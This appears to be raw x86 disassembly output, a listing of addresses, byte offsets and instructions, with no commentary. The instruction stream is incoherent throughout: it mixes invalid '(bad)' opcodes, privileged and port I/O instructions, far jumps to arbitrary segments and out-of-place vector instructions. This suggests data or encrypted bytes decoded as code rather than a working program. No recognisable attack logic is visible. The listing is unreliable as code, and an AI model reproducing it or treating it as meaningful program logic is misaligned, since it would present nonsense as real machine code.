  41875d:	test   BYTE PTR [edi-0x432cd102],0x4
  418764:	movq   mm2,mm0
  418767:	lods   eax,DWORD PTR ds:[esi]
  418768:	xor    eax,0xb2ef99dc
  41876d:	jne    0x418733
  41876f:	mov    DWORD PTR [eax-0x77],eax
  418772:	fild   DWORD PTR [edx+esi*2-0x44]
  418776:	iret   
  418777:	shl    DWORD PTR [ebx+0x1a],1
  41877a:	pop    ebp
  41877b:	hlt    
  41877c:	push   ebp
  41877d:	inc    ebp
  41877e:	jmp    0xb1839b71
  418783:	dec    esi
  418784:	mov    ecx,ebx
  418786:	jnp    0x418802
  418788:	adc    DWORD PTR [ebp+0x40],ecx
  41878b:	rol    DWORD PTR [ebx+0x75],0x8
  41878f:	jmp    0xed7a36b5
  418794:	test   edx,eax
  418796:	or     al,0xf3
  418798:	repnz loope 0x4187df
  41879b:	outs   dx,BYTE PTR ds:[esi]
  41879c:	add    bh,BYTE PTR [edx-0x572522b8]
  4187a2:	cmp    ebx,edx
  4187a4:	jo     0x418767
  4187a6:	data16 or ch,dh
  4187a9:	mov    ebx,0xee3fe5e9
  4187ae:	call   0x7920:0xb1dddb5d
  4187b5:	xchg   ebx,eax
  4187b6:	ss jmp 0xa0fc:0x885d8eca
  4187be:	(bad)  
  4187c0:	push   ebp
  4187c1:	cdq    
  4187c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187c3:	sbb    eax,0x93af3617
  4187c8:	and    al,0x99
  4187ca:	lea    ebx,[esi-0x5dc6b5d9]
  4187d0:	push   ds
  4187d1:	jmp    0xf25938f3
  4187d6:	sub    BYTE PTR [esp+edx*2],bl
  4187d9:	sahf   
  4187da:	pop    ebx
  4187db:	jmp    0x4187fe
  4187dd:	mov    dh,0xd1
  4187df:	and    ah,BYTE PTR [eax]
  4187e1:	push   ds
  4187e2:	mov    al,ds:0xbf4c3dbe
  4187e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e8:	pop    es
  4187e9:	jno    0x418845
  4187eb:	xchg   esp,eax
  4187ec:	std    
  4187ed:	pushf  
  4187ee:	sub    eax,ecx
  4187f0:	aas    
  4187f1:	push   es
  4187f2:	sbb    esp,ebp
  4187f4:	cs or  eax,0x4e30b799
  4187fa:	mov    bl,0xa4
  4187fc:	or     eax,0x672f0f4b
  418801:	fisub  WORD PTR [edx+edi*4+0x2f6cbba]
  418808:	xor    eax,0x1c995899
  41880d:	mov    ecx,0x817ac361
  418812:	inc    edi
  418813:	daa    
  418814:	lds    ebp,FWORD PTR [edx-0x51203245]
  41881a:	adc    edi,edi
  41881c:	iret   
  41881d:	sbb    al,0xcb
  41881f:	ins    DWORD PTR es:[edi],dx
  418820:	and    BYTE PTR [ecx+0x4d],cl
  418823:	jp     0x4187f7
  418825:	mov    bl,0xf6
  418827:	fild   WORD PTR [esi]
  418829:	leave  
  41882a:	sti    
  41882b:	aam    0x11
  41882d:	pop    ds
  41882e:	pop    eax
  41882f:	inc    ebx
  418830:	and    al,0xf
  418832:	out    dx,al
  418833:	xor    BYTE PTR [eax],cl
  418835:	call   0x723f:0xb62144d5
  41883c:	mov    eax,0xdd34646f
  418841:	test   al,0xbb
  418843:	sar    ebx,0xdb
  418846:	lahf   
  418847:	cs gs mov bl,0xab
  41884b:	and    ah,ah
  41884d:	jno    0x418804
  41884f:	fs xor eax,0x15413a9c
  418855:	and    eax,0x24a5ec99
  41885a:	mov    eax,ds:0xa5f91b74
  41885f:	in     eax,dx
  418860:	pop    eax
  418861:	pop    eax
  418862:	fisubr WORD PTR [ebx+esi*1-0x5b]
  418866:	mov    ebx,DWORD PTR ds:0x7863e6c3
  41886c:	icebp  
  41886d:	stos   BYTE PTR es:[edi],al
  41886e:	pop    ecx
  41886f:	mov    DWORD PTR [eax],esp
  418871:	sub    DWORD PTR [edx-0x44],eax
  418874:	and    ebx,DWORD PTR [ebp-0x6d6cda0b]
  41887a:	or     al,0x1a
  41887c:	sar    BYTE PTR [eax-0x29],cl
  41887f:	cmp    al,0xcf
  418881:	jecxz  0x41883e
  418883:	inc    esp
  418884:	push   ss
  418885:	cmp    DWORD PTR [ebx],eax
  418887:	enter  0xebaf,0xb
  41888b:	mov    esp,0x7353701c
  418890:	add    eax,0x55ec6942
  418895:	mov    esp,0x391e6c8d
  41889a:	sbb    edi,eax
  41889c:	add    DWORD PTR ds:0x9cb42530,eax
  4188a2:	or     edi,ecx
  4188a4:	addr16 sbb al,0x41
  4188a7:	lock jbe 0x418859
  4188aa:	lods   eax,DWORD PTR ds:[esi]
  4188ab:	daa    
  4188ac:	xor    eax,0x7bc1cc9
  4188b1:	jb     0x41886c
  4188b3:	pop    edi
  4188b4:	mov    ch,BYTE PTR [eax]
  4188b6:	push   ss
  4188b7:	mov    ch,0x8a
  4188b9:	mov    ds:0x385297b,al
  4188be:	jmp    0xe7491516
  4188c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c4:	add    DWORD PTR [edx-0x77],edi
  4188c7:	xchg   esi,eax
  4188c8:	dec    DWORD PTR [ecx+edi*4-0x48]
  4188cc:	(bad)  
  4188ce:	sti    
  4188cf:	add    BYTE PTR [eax+edi*8],bl
  4188d2:	sbb    ebx,DWORD PTR [eax-0x174fe783]
  4188d8:	sbb    edi,DWORD PTR [ecx]
  4188da:	daa    
  4188db:	icebp  
  4188dc:	mov    al,ds:0x5f44f30d
  4188e1:	mov    ebx,0x8185a0da
  4188e6:	lods   al,BYTE PTR ds:[esi]
  4188e7:	call   0x1617f597
  4188ec:	and    DWORD PTR [ecx],ecx
  4188ee:	outs   dx,BYTE PTR ds:[esi]
  4188ef:	in     al,dx
  4188f0:	seta   BYTE PTR [ebp-0x56226a6d]
  4188f7:	xchg   edi,eax
  4188f8:	gs mov al,0x98
  4188fb:	icebp  
  4188fc:	dec    ebx
  4188fd:	test   BYTE PTR [edx],ah
  4188ff:	(bad)  
  418901:	in     al,dx
  418902:	gs int3 
  418904:	in     eax,0x3b
  418906:	cmp    al,0xe8
  418908:	lahf   
  418909:	adc    cl,BYTE PTR [edi-0x66]
  41890c:	xchg   ebp,eax
  41890d:	loopne 0x4188f0
  41890f:	cli    
  418910:	mov    ds:0xe37a16d8,al
  418915:	cmp    dh,BYTE PTR [ebx-0x7a31574d]
  41891b:	inc    esi
  41891c:	jnp    0x41895a
  41891e:	mov    ah,0xc8
  418920:	cmp    DWORD PTR [ebx+0x694888ab],esp
  418926:	popf   
  418927:	adc    edx,DWORD PTR [ecx-0x28]
  41892a:	mov    ds:0xadb54b5e,eax
  41892f:	cmc    
  418930:	ja     0x41890e
  418932:	outs   dx,BYTE PTR ds:[esi]
  418933:	cli    
  418934:	push   ss
  418935:	jbe    0x418928
  418937:	pusha  
  418938:	mov    ch,0x93
  41893a:	mov    bl,0xed
  41893c:	xor    ebx,DWORD PTR [eax-0x56e50954]
  418942:	add    al,BYTE PTR [edx-0x51]
  418945:	shl    BYTE PTR [eax+ebp*8],1
  418948:	xchg   ebx,eax
  418949:	into   
  41894a:	imul   ecx,DWORD PTR [ebp+0x141422e0],0xffffff99
  418951:	fs arpl ax,si
  418954:	push   ss
  418955:	sub    ecx,eax
  418957:	imul   edx,DWORD PTR [edx-0x43],0x21
  41895b:	or     eax,0x627c8588
  418960:	add    esi,0x9dcaed7b
  418966:	repz mov esi,0x5df25cf4
  41896c:	call   0x3c7b:0x6004bb16
  418973:	adc    esp,DWORD PTR [ebp+0x65ef4380]
  418979:	pop    ss
  41897a:	jl     0x41893f
  41897c:	sbb    bh,BYTE PTR [eax+ebp*8+0x5597b438]
  418983:	lods   al,BYTE PTR ds:[esi]
  418984:	mov    ch,0x56
  418986:	iret   
  418987:	in     eax,dx
  418988:	mov    WORD PTR [eax+edi*8+0x69],ds
  41898c:	jecxz  0x418956
  41898e:	push   ds
  41898f:	cs hlt 
  418991:	push   eax
  418992:	ret    
  418993:	add    al,0x16
  418995:	adc    al,0xc
  418997:	push   ecx
  418998:	mov    eax,ds:0xff20bd82
  41899d:	test   al,0x27
  41899f:	or     ebx,DWORD PTR [edx-0x6df941f4]
  4189a5:	sbb    BYTE PTR [esi],0xfb
  4189a8:	icebp  
  4189a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189aa:	pop    ebx
  4189ab:	sub    al,dh
  4189ad:	add    eax,0x94cfe23d
  4189b2:	in     al,dx
  4189b3:	pop    edi
  4189b4:	fadd   QWORD PTR [edi+0x45b289b8]
  4189ba:	jle    0x4189bc
  4189bc:	mov    ebx,0xcc51cae4
  4189c1:	fldcw  WORD PTR [ecx-0x4457fcee]
  4189c7:	iret   
  4189c8:	or     cl,BYTE PTR [eax+0x64]
  4189cb:	mov    ebp,0xdb702736
  4189d0:	out    dx,al
  4189d1:	jle    0x4189bd
  4189d3:	out    dx,al
  4189d4:	add    eax,0x10ebb58d
  4189d9:	mov    ebp,ecx
  4189db:	xchg   ebp,eax
  4189dc:	in     al,0x34
  4189de:	mov    ecx,0x8d8fec34
  4189e3:	aam    0x15
  4189e5:	in     al,dx
  4189e6:	shr    dl,0x74
  4189e9:	loopne 0x41897a
  4189eb:	add    dl,ah
  4189ed:	loopne 0x418a18
  4189ef:	aam    0x37
  4189f1:	push   ebx
  4189f2:	mov    dl,0x64
  4189f4:	jp     0x41899f
  4189f6:	push   edi
  4189f7:	mov    ah,dh
  4189f9:	hlt    
  4189fa:	mov    bl,0x5a
  4189fc:	push   es
  4189fd:	lahf   
  4189fe:	jp     0x418a1a
  418a00:	sbb    DWORD PTR [esi-0x5b],edx
  418a03:	mov    edi,0x66a2bd99
  418a08:	les    esp,FWORD PTR [ecx-0x38292e65]
  418a0e:	mov    al,0xed
  418a10:	xchg   ebp,eax
  418a11:	(bad)  
  418a12:	jle    0x418a13
  418a14:	shl    DWORD PTR [ebp+0x4b855c0c],cl
  418a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1b:	je     0x418a83
  418a1d:	lods   eax,DWORD PTR ds:[esi]
  418a1e:	mov    esi,0x73719354
  418a23:	mov    ebp,0x402b4d6
  418a28:	and    ebp,DWORD PTR [ebp-0x75]
  418a2b:	jbe    0x418a6f
  418a2d:	pop    edi
  418a2e:	mov    eax,0x72291e7a
  418a33:	das    
  418a34:	into   
  418a35:	xchg   BYTE PTR [edi-0x52],ah
  418a38:	pop    es
  418a39:	sbb    DWORD PTR [ebp-0x48c1c4c4],0xffffffbd
  418a40:	push   ebx
  418a41:	outs   dx,DWORD PTR ds:[esi]
  418a42:	mov    ecx,0xd1e75384
  418a47:	sbb    BYTE PTR ds:0xd674b858,0x64
  418a4e:	or     DWORD PTR [esi*4+0x57f8e31a],0xa445c3b5
  418a59:	ins    BYTE PTR es:[edi],dx
  418a5a:	retf   0xb62a
  418a5d:	sub    edi,DWORD PTR [edx-0x7c2a435c]
  418a63:	pop    edx
  418a64:	xchg   BYTE PTR ds:0xa5ea572d,bh
  418a6a:	add    ch,BYTE PTR [ebx+ebx*1+0x5bac889e]
  418a71:	div    esp
  418a73:	push   esp
  418a74:	dec    ebx
  418a75:	sar    ebx,1
  418a77:	add    al,0xf4
  418a79:	xchg   ebx,eax
  418a7a:	shl    bh,cl
  418a7c:	cmp    eax,0x8e203ba2
  418a81:	pusha  
  418a82:	sbb    eax,0xf0d281c
  418a87:	jmp    0xa6f3:0xc89ba7a8
  418a8e:	jl     0x418a17
  418a90:	mov    WORD PTR [ebp-0x6418d165],gs
  418a96:	ds cmc 
  418a98:	(bad)  
  418a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a9a:	push   cs
  418a9b:	popa   
  418a9c:	sbb    DWORD PTR [ecx+0x1486075c],ebp
  418aa2:	in     eax,dx
  418aa3:	jmp    0x4fbd:0xe1d7e2b
  418aaa:	mov    ebx,0xb3f579b9
  418aaf:	xchg   esp,eax
  418ab0:	ins    DWORD PTR es:[edi],dx
  418ab1:	mov    eax,0x6c9f464f
  418ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab7:	jne    0x418ac8
  418ab9:	gs icebp 
  418abb:	call   0xe29e0ed5
  418ac0:	push   es
  418ac1:	shl    DWORD PTR [eax],1
  418ac3:	stos   DWORD PTR es:[edi],eax
  418ac4:	stos   DWORD PTR es:[edi],eax
  418ac5:	xchg   DWORD PTR [edi-0x1d1de9f4],esi
  418acb:	or     ah,BYTE PTR [ecx]
  418acd:	sbb    DWORD PTR [ebp-0x74cc0941],edi
  418ad3:	fldenv [edx-0x2f1de45a]
  418ad9:	loopne 0x418a5c
  418adb:	outs   dx,DWORD PTR ds:[esi]
  418adc:	mov    eax,ds:0x83ffbfe5
  418ae1:	mov    dh,BYTE PTR [ebx-0x35076ddc]
  418ae7:	jl     0x418b4e
  418ae9:	pop    ebx
  418aea:	cwde   
  418aeb:	out    0x45,al
  418aed:	std    
  418aee:	xchg   DWORD PTR [ecx-0x119a8650],ebx
  418af4:	pop    esi
  418af5:	pusha  
  418af6:	mov    cl,0x9e
  418af8:	kxorw  k4,k6,k7
  418afc:	inc    ebp
  418afd:	mov    ebx,0x14af2283
  418b02:	xchg   esp,eax
  418b03:	push   ebp
  418b04:	call   0xa116a0a4
  418b09:	mov    eax,ebx
  418b0b:	lds    esi,FWORD PTR ds:0x61ea4acf
  418b11:	push   esp
  418b12:	ins    DWORD PTR es:[edi],dx
  418b13:	add    BYTE PTR [ecx+0x185098d9],dl
  418b19:	out    dx,eax
  418b1a:	mov    ds:0xcccf6c59,al
  418b1f:	mov    esi,0x51fc2be4
  418b24:	jmp    0xb52a:0x8e153560
  418b2b:	sbb    al,0x9b
  418b2d:	loopne 0x418b4d
  418b2f:	bound  ebp,QWORD PTR [edi]
  418b31:	jle    0x418ac8
  418b33:	xchg   ebp,eax
  418b34:	add    esp,0xffffffaf
  418b37:	call   0x29d4efd8
  418b3c:	aaa    
  418b3d:	test   eax,0xb50dd2b3
  418b42:	adc    ebx,ebp
  418b44:	jmp    0x418b25
  418b46:	jns    0x418ae1
  418b48:	sbb    al,0x79
  418b4a:	js     0x418af8
  418b4c:	adc    dh,dl
  418b4e:	cdq    
  418b4f:	sti    
  418b50:	push   ds
  418b51:	mov    ds:0x696a57ab,al
  418b56:	outs   dx,DWORD PTR ds:[esi]
  418b57:	imul   esi,DWORD PTR [ecx],0xffffffb7
  418b5a:	xor    al,0x5e
  418b5c:	and    ebx,0xd82064bf
  418b62:	fst    QWORD PTR [ecx-0x178c26db]
  418b68:	cmp    al,0x1c
  418b6a:	fnsave [edx]
  418b6c:	mov    eax,ds:0xc1f663e2
  418b71:	into   
  418b72:	mov    esi,0x869fb304
  418b77:	mov    edi,ebp
  418b79:	cdq    
  418b7a:	or     ebp,DWORD PTR [ebx+ebx*8+0x36]
  418b7e:	or     al,0x1a
  418b80:	jb     0x418b18
  418b82:	ret    0xc723
  418b85:	test   al,0x93
  418b87:	dec    eax
  418b88:	sub    BYTE PTR [ecx-0x7091f74a],dl
  418b8e:	std    
  418b8f:	arpl   WORD PTR [eax-0x14],sp
  418b92:	(bad)  
  418b93:	hlt    
  418b94:	aas    
  418b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b96:	jecxz  0x418c0b
  418b98:	ss stc 
  418b9a:	stos   BYTE PTR es:[edi],al
  418b9b:	test   BYTE PTR [eax],0x58
  418b9e:	mov    ebx,0xeee26004
  418ba3:	adc    dh,BYTE PTR [esi-0x77]
  418ba6:	outs   dx,DWORD PTR ds:[esi]
  418ba7:	scas   eax,DWORD PTR es:[edi]
  418ba8:	test   BYTE PTR [ecx],ch
  418baa:	and    esp,DWORD PTR [esi+esi*4+0x3e]
  418bae:	mov    ebx,0xfd247334
  418bb3:	call   0x302d:0xe791a3c5
  418bba:	mov    esp,DWORD PTR [edx+0x3995691a]
  418bc0:	aaa    
  418bc1:	(bad)  
  418bc2:	cmc    
  418bc3:	pop    es
  418bc4:	dec    esi
  418bc5:	ds cmp esi,edx
  418bc8:	es std 
  418bca:	test   eax,0xd72517c8
  418bcf:	xchg   esp,eax
  418bd0:	sub    cl,bh
  418bd2:	aas    
  418bd3:	jns    0x418b56
  418bd5:	jle    0x418b8b
  418bd7:	xchg   esp,eax
  418bd8:	les    dx,DWORD PTR [ebx]
  418bdb:	jl     0x418bb4
  418bdd:	sar    BYTE PTR [edx-0x28],1
  418be0:	sbb    eax,0x31ea7027
  418be5:	mov    edx,0xb5787915
  418bea:	mov    ebp,0x2a10ae74
  418bef:	inc    ecx
  418bf0:	mov    ch,0x51
  418bf2:	mov    ebp,gs
  418bf4:	pop    ss
  418bf5:	mov    esi,0x39174f39
  418bfa:	(bad)  
  418bfb:	(bad)  
  418bfd:	or     edi,DWORD PTR [edi+0xb9b84ac]
  418c03:	test   al,0x47
  418c05:	pop    eax
  418c06:	sbb    ecx,DWORD PTR [esp+edx*1]
  418c09:	pop    esi
  418c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c0b:	mov    bl,ch
  418c0d:	faddp  st(2),st
  418c0f:	xor    al,0x17
  418c11:	je     0x418bb8
  418c13:	or     BYTE PTR [esi+0x79],0xfc
  418c17:	jb     0x418be5
  418c19:	xor    al,0x47
  418c1b:	test   DWORD PTR [eax-0x4924f859],ebx
  418c21:	shl    DWORD PTR [ecx+eax*8],1
  418c24:	add    DWORD PTR [ecx],ebx
  418c26:	jle    0x418bfb
  418c28:	test   DWORD PTR [eax+0x15af4cc],esi
  418c2e:	add    eax,0xb076c2eb
  418c33:	or     BYTE PTR [ebp-0x71105e98],ah
  418c39:	gs (bad) 
  418c3c:	std    
  418c3d:	sbb    al,0x74
  418c3f:	jmp    0xe6b88451
  418c44:	rcl    edx,cl
  418c46:	daa    
  418c47:	fbld   TBYTE PTR ds:0x67a1888c
  418c4d:	test   al,0x6f
  418c4f:	les    eax,FWORD PTR [ecx]
  418c51:	lahf   
  418c52:	test   eax,esi
  418c54:	cdq    
  418c55:	std    
  418c56:	jb     0x418c55
  418c58:	sub    edx,edi
  418c5a:	outs   dx,BYTE PTR ds:[esi]
  418c5b:	imul   ecx,esp,0x91d27ba1
  418c61:	dec    ebp
  418c62:	shr    DWORD PTR [eax+edi*8],1
  418c65:	ja     0x418ca9
  418c67:	or     al,BYTE PTR [edx-0x2a]
  418c6a:	mov    ah,0xa4
  418c6c:	ret    0x223a
  418c6f:	jno    0x418c57
  418c71:	out    0xc4,al
  418c73:	loop   0x418c93
  418c75:	mov    eax,ds:0xc4566d19
  418c7a:	adc    DWORD PTR [edi+0x2562eb79],0xffffffd5
  418c81:	push   edi
  418c82:	jge    0x418c82
  418c84:	cdq    
  418c85:	mov    dh,0xd8
  418c87:	out    dx,eax
  418c88:	inc    edi
  418c89:	jo     0x418c91
  418c8b:	fisttp WORD PTR [ebx]
  418c8d:	lahf   
  418c8e:	test   esi,0x7394a836
  418c94:	pop    ds
  418c95:	jmp    0xd72b0b61
  418c9a:	sbb    eax,0xe71efda7
  418c9f:	adc    esi,edi
  418ca1:	inc    edi
  418ca2:	out    dx,al
  418ca3:	fdivrp st(1),st
  418ca5:	bound  esp,QWORD PTR [esi-0x1a0bf226]
  418cab:	out    0xf0,eax
  418cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cae:	mov    ah,0x95
  418cb0:	pop    edx
  418cb1:	loop   0x418cd9
  418cb3:	lds    ebx,FWORD PTR [ecx]
  418cb5:	iret   
  418cb6:	clc    
  418cb7:	push   0x30
  418cb9:	popf   
  418cba:	mov    edx,DWORD PTR [edx-0x6f]
  418cbd:	push   ecx
  418cbe:	pop    esp
  418cbf:	cli    
  418cc0:	mov    ebp,0x29e6c94d
  418cc5:	adc    edi,DWORD PTR [ebp-0x4033331c]
  418ccb:	push   ds
  418ccc:	push   ebp
  418ccd:	mov    ebp,0x7502f315
  418cd2:	pop    ds
  418cd3:	in     al,0x3a
  418cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd6:	in     eax,dx
  418cd7:	inc    ecx
  418cd8:	dec    eax
  418cd9:	aam    0xa3
  418cdb:	fsubr  DWORD PTR [ebp+esi*8-0x16]
  418cdf:	push   ds
  418ce0:	lea    edx,[esi-0x1b]
  418ce3:	repnz pop ebp
  418ce5:	lahf   
  418ce6:	sti    
  418ce7:	push   eax
  418ce8:	add    ch,BYTE PTR [edi+0x7186b94a]
  418cee:	(bad)  
  418cf0:	arpl   WORD PTR [eax+0x6d43745a],sp
  418cf6:	mov    al,0xb4
  418cf8:	jmp    0x418d1c
  418cfa:	es and esi,edi
  418cfd:	pop    ebx
  418cfe:	lods   eax,DWORD PTR ds:[esi]
  418cff:	jmp    0x71c92b03
  418d04:	mov    ds:0x251489e5,eax
  418d09:	sub    eax,esi
  418d0b:	mov    ss,WORD PTR [edi+ebx*2-0x49ad8495]
  418d12:	retf   
  418d13:	inc    al
  418d15:	(bad)  
  418d16:	aaa    
  418d17:	retf   0x25bb
  418d1a:	cmp    ah,BYTE PTR [edi+0x523bc921]
  418d20:	std    
  418d21:	jp     0x418cca
  418d23:	bound  esi,QWORD PTR [ecx+edi*2]
  418d26:	dec    edx
  418d27:	icebp  
  418d28:	gs mov ch,0x98
  418d2b:	jmp    0x82211d47
  418d30:	and    ebp,DWORD PTR [ecx-0xb115379]
  418d36:	jbe    0x418d44
  418d38:	push   esp
  418d39:	test   al,0x2b
  418d3b:	sbb    BYTE PTR ds:0x433813b8,0x78
  418d42:	fiadd  DWORD PTR [esi]
  418d44:	sub    edi,0x9926e4bb
  418d4a:	mov    ds:0xa50985bc,al
  418d4f:	repz fisttp WORD PTR [esi+0x50]
  418d53:	mov    WORD PTR [edi],ss
  418d55:	cmp    DWORD PTR [edi],esi
  418d57:	jbe    0x418d96
  418d59:	ins    DWORD PTR es:[edi],dx
  418d5a:	ficomp DWORD PTR [edi+0x4e]
  418d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5e:	pop    ebx
  418d5f:	mul    DWORD PTR ds:0xa64c7b7b
  418d65:	add    eax,0xf0571f8e
  418d6a:	jle    0x418db0
  418d6c:	jl     0x418d13
  418d6e:	iret   
  418d6f:	add    al,0x78
  418d71:	shr    BYTE PTR [esi],0x5f
  418d74:	sub    BYTE PTR [ecx-0x7b32c05],bl
  418d7a:	add    esi,edi
  418d7c:	lea    ebx,[edx]
  418d7e:	(bad)  
  418d7f:	rcr    bh,1
  418d81:	lahf   
  418d82:	pusha  
  418d83:	push   ebp
  418d84:	(bad)  
  418d85:	loop   0x418def
  418d87:	sbb    DWORD PTR [ecx],edx
  418d89:	sbb    al,0xf7
  418d8b:	out    dx,eax
  418d8c:	in     eax,0x85
  418d8e:	or     eax,0xcced6eb
  418d93:	jg     0x418db2
  418d95:	hlt    
  418d96:	fidivr DWORD PTR ds:0xe4bfc8dc
  418d9c:	adc    DWORD PTR ds:0xf7d5259b,esi
  418da2:	dec    edi
  418da3:	call   0xf4c6e7b2
  418da8:	sbb    DWORD PTR [ecx],ecx
  418daa:	inc    edx
  418dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dac:	in     eax,0xe1
  418dae:	leave  
  418daf:	dec    ecx
  418db0:	or     bh,dl
  418db2:	mov    edx,DWORD PTR [ebp+0x1ea912cf]
  418db8:	and    ah,bl
  418dba:	mov    edi,0xe29988e2
  418dbf:	jle    0x418df1
  418dc1:	xchg   edx,eax
  418dc2:	ret    
  418dc3:	call   0xe20a91f9
  418dc8:	into   
  418dc9:	lahf   
  418dca:	mov    ebx,0x11f64f67
  418dcf:	dec    esp
  418dd0:	test   BYTE PTR [esp+ebx*1],0xe6
  418dd4:	mov    esp,0x624b7bf
  418dd9:	inc    esp
  418dda:	popf   
  418ddb:	scas   eax,DWORD PTR es:[edi]
  418ddc:	sub    DWORD PTR [ebx-0xd0f81a3],edi
  418de2:	jmp    0x82d9a643
  418de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de8:	push   ss
  418de9:	dec    ecx
  418dea:	push   edx
  418deb:	xchg   DWORD PTR [edx+0x3d],esp
  418dee:	rcl    BYTE PTR [edi+0x362d2571],1
  418df4:	sub    eax,DWORD PTR [esi]
  418df6:	or     al,0x17
  418df9:	leave  
  418dfa:	cli    
  418dfb:	out    dx,al
  418dfc:	mul    BYTE PTR [esi-0x648b8798]
  418e02:	imul   esp,DWORD PTR [edx],0x0
  418e05:	into   
  418e06:	fwait
  418e07:	sbb    BYTE PTR [edx+0x28],bl
  418e0a:	mov    dl,0x3c
  418e0c:	push   ss
  418e0d:	push   0x62b634b4
  418e12:	mov    ah,BYTE PTR ds:0x85bbcbbd
  418e18:	mov    ecx,0x19db2d5a
  418e1d:	push   ebp
  418e1e:	dec    esi
  418e1f:	mov    dh,0x24
  418e21:	sbb    DWORD PTR [ecx],edx
  418e23:	jne    0x418e6d
  418e25:	repnz arpl WORD PTR [edi],di
  418e28:	int    0x9f
  418e2a:	mov    ebx,0xd2f54aa6
  418e2f:	inc    edx
  418e30:	inc    edi
  418e31:	push   ecx
  418e32:	in     al,dx
  418e33:	stos   BYTE PTR es:[edi],al
  418e34:	pop    ds
  418e35:	pop    ecx
  418e36:	xchg   esp,eax
  418e37:	cld    
  418e38:	lahf   
  418e39:	pop    ss
  418e3a:	ds mov esi,0x4eebb6a5
  418e40:	pop    esp
  418e41:	clc    
  418e42:	mov    ebp,edi
  418e44:	shl    edx,0x18
  418e47:	push   ds
  418e48:	and    edi,DWORD PTR [eax-0x22866b37]
  418e4e:	mov    ch,0x24
  418e50:	cs clc 
  418e52:	addr16 in eax,dx
  418e54:	test   DWORD PTR [ecx],ebx
  418e56:	repnz in eax,0xd4
  418e59:	xchg   ebx,eax
  418e5a:	ins    DWORD PTR es:[edi],dx
  418e5b:	out    dx,al
  418e5c:	sbb    BYTE PTR [ecx-0x32],ch
  418e5f:	fst    QWORD PTR [edx-0x589e396e]
  418e66:	imul   edx,DWORD PTR [edx],0xffffffb5
  418e69:	retf   0x21c2
  418e6c:	add    eax,0x7a62192e
  418e71:	dec    ebp
  418e72:	mov    cl,0x74
  418e74:	mov    DWORD PTR [edi-0x560a2297],ebx
  418e7a:	jg     0x418e61
  418e7c:	ins    DWORD PTR es:[edi],dx
  418e7d:	shr    al,cl
  418e7f:	sbb    DWORD PTR [edi],0xfffffff9
  418e82:	(bad)
  418e85:	clc    
  418e86:	or     eax,0xeba0f810
  418e8b:	jmp    0x32dee658
  418e90:	mov    cs,WORD PTR [edi+0x7521f114]
  418e96:	mov    ebx,0xfdbbc884
  418e9b:	push   eax
  418e9c:	es adc eax,0x87d70c78
  418ea2:	pusha  
  418ea3:	and    BYTE PTR cs:[eax-0x4a],al
  418ea7:	xor    BYTE PTR [ecx+edi*8],bl
  418eaa:	das    
  418eab:	ins    BYTE PTR es:[edi],dx
  418eac:	dec    ebp
  418ead:	int    0xd0
  418eaf:	or     al,0xf
  418eb1:	fwait
  418eb2:	retf   
  418eb3:	sbb    eax,0x7349e416
  418eb8:	xor    BYTE PTR [edi+esi*8],bh
  418ebb:	push   eax
  418ebc:	mov    dl,0xfe
  418ebe:	fsub   QWORD PTR [esi+edi*1-0x7ee1cc62]
  418ec5:	pop    eax
  418ec6:	pop    es
  418ec7:	out    dx,eax
  418ec8:	test   esi,ebp
  418eca:	mov    dl,0xe6
  418ecc:	xor    eax,ebp
  418ece:	mov    ebp,0x29594942
  418ed3:	je     0x418e56
  418ed5:	test   BYTE PTR [ebp-0x418cf3],al
  418edb:	jae    0x418ea1
  418edd:	mov    ds:0x1a39b4ab,eax
  418ee2:	in     al,dx
  418ee3:	dec    ebp
  418ee4:	push   0x3f063a50
  418ee9:	inc    ecx
  418eea:	cwde   
  418eeb:	jne    0x418f64
  418eed:	(bad)
  418ef0:	jb     0x418f10
  418ef2:	aad    0x1
  418ef4:	sbb    bl,bh
  418ef6:	or     ebp,DWORD PTR [ecx-0x2af222b]
  418efc:	dec    esi
  418efd:	pushf  
  418efe:	mov    eax,0x916953a9
  418f03:	sbb    esi,DWORD PTR [ebx+0x1e32a5c2]
  418f09:	sbb    ecx,DWORD PTR [esi]
  418f0b:	push   0xffffffbd
  418f0d:	mov    al,ds:0x75ec809b
  418f12:	(bad)  
  418f14:	pop    ecx
  418f15:	das    
  418f16:	in     eax,0xfb
  418f18:	push   edx
  418f19:	jns    0x418f56
  418f1b:	out    dx,al
  418f1c:	std    
  418f1d:	in     eax,0x1f
  418f1f:	outs   dx,DWORD PTR ds:[esi]
  418f20:	and    BYTE PTR [ecx-0x1d],0xe9
  418f24:	cmc    
  418f25:	fs fdivr st(3),st
  418f28:	xchg   esp,eax
  418f29:	outs   dx,DWORD PTR ds:[esi]
  418f2a:	iret   
  418f2b:	fild   QWORD PTR ss:[edx-0x4ee01dfd]
  418f32:	xchg   cl,dl
  418f34:	popf   
  418f35:	inc    eax
  418f36:	mov    cs,WORD PTR ds:0xec724b15
  418f3c:	xor    esi,DWORD PTR [edi-0x7e]
  418f3f:	outs   dx,DWORD PTR ds:[esi]
  418f40:	fsub   QWORD PTR [eax]
  418f42:	inc    edi
  418f43:	jb     0x418f5d
  418f45:	clc    
  418f46:	mov    esi,0x40ad4d4
  418f4b:	cmp    eax,0xe6545bb5
  418f50:	enter  0xf761,0xc7
  418f54:	lods   al,BYTE PTR ds:[esi]
  418f55:	jo     0x418fb4
  418f57:	xchg   edx,eax
  418f58:	inc    edi
  418f59:	mov    eax,0x4e07367c
  418f5e:	mov    edx,0xcba668fc
  418f63:	cmp    dh,BYTE PTR ds:0x937f6419
  418f69:	pop    esi
  418f6a:	shl    DWORD PTR [eax+0x8aba2dc],0x42
  418f71:	or     dl,bh
  418f73:	mov    dl,0x26
